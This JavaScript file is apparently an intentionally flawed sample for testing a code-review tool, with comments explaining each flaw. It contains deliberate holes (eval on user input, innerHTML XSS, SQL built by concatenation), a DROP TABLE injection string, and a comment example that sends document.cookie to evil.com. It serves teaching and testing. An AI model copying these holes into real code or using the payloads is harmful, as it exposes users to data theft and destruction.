// sample-code/sample.js
// ======================
// INTENTIONALLY bad JavaScript — for testing Autopsy AI
// Every comment explains WHAT is wrong and WHY it matters

// ISSUE: Hardcoded secrets in source code
// WHY BAD: Anyone who sees this file (GitHub, colleagues) gets your credentials
var SECRET_KEY = "sk_live_abc123secretkey456789";
var DB_PASSWORD = "admin123";
var JWT_TOKEN = "eyJhbGciOiJIUzI1NiJ9.hardcoded";

// ISSUE: var instead of const/let (ES6+ standard)
// WHY BAD: var is function-scoped and hoisted, causing subtle bugs
var TIMEOUT = 86400;    // ISSUE: Magic number — what does 86400 mean?
var MAX = 9999;         // ISSUE: Magic number — 9999 what?

// ISSUE: Unused variable
var unusedConfiguration = { debug: true, verbose: false };


// ISSUE: God function — does data filtering, SQL querying, AND calculation
// ISSUE: Too long (50+ lines), doing multiple unrelated things
// ISSUE: No JSDoc comments explaining parameters
function doEverything(data) {
    var result = [];
    var unusedInsideFunction = "never used";  // ISSUE: Unused variable

    // ISSUE: Deep nesting — 4 levels of indentation
    for (var i = 0; i < data.length; i++) {
        var x = data[i];          // ISSUE: Poor variable name
        if (x > 0) {
            if (x < 100) {
                if (x % 2 == 0) { // ISSUE: == instead of === (loose equality)
                    if (x % 3 == 0) {
                        result.push(x);
                    }
                }
            }
        }
    }

    // ISSUE: SQL Injection vulnerability
    // WHY BAD: If user types: 1; DROP TABLE users; --
    // The query becomes: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
    var userId = document.getElementById('user-input').value;
    var query = "SELECT * FROM users WHERE id = " + userId;
    // database.execute(query);   ← This would destroy your database

    // ISSUE: DRY violation — exact same summation logic written 3 times
    var total = 0;
    for (var j = 0; j < result.length; j++) {
        total = total + result[j];
    }

    var sum = 0;
    for (var k = 0; k < result.length; k++) {
        sum = sum + result[k];
    }

    var runningTotal = 0;
    for (var m = 0; m < result.length; m++) {
        runningTotal = runningTotal + result[m];
    }

    // ISSUE: Debug logs left in production
    console.log("DEBUG: total =", total);
    console.log("DEBUG: result =", result);

    return { total: total, sum: sum, results: result };
}


// ISSUE: Meaningless function name 'f'
// WHY BAD: What does 'f' do? What do 'a' and 'b' represent?
function f(a, b) {
    return a + b;
}


// ISSUE: eval() usage — most dangerous function in JavaScript
// WHY BAD: If user controls evalCode, they can run ANY JavaScript
// including: evalCode = "document.location='https://evil.com?c='+document.cookie"
function runCode(evalCode) {
    return eval(evalCode);   // NEVER do this with user input
}


// ISSUE: No error handling
// WHY BAD: What if fetch fails? What if the JSON is malformed?
// What if the network is offline? All of these crash silently.
function fetchUserData(url) {
    return fetch(url)
        .then(response => response.json());
    // No .catch() — any error is swallowed silently
}


// ISSUE: innerHTML with user data — XSS vulnerability
// WHY BAD: If userName contains <script>alert('hacked')</script>
// it will execute as JavaScript in the browser
function displayUser(userName) {
    document.getElementById('user-display').innerHTML = userName;
    // Use .textContent instead of .innerHTML for user data
}


// ISSUE: No input validation anywhere
// ISSUE: Function name 'process' is too vague
function process(input) {
    // What if input is null? Undefined? A number? An array?
    return input.toUpperCase();  // Crashes if input is not a string
}
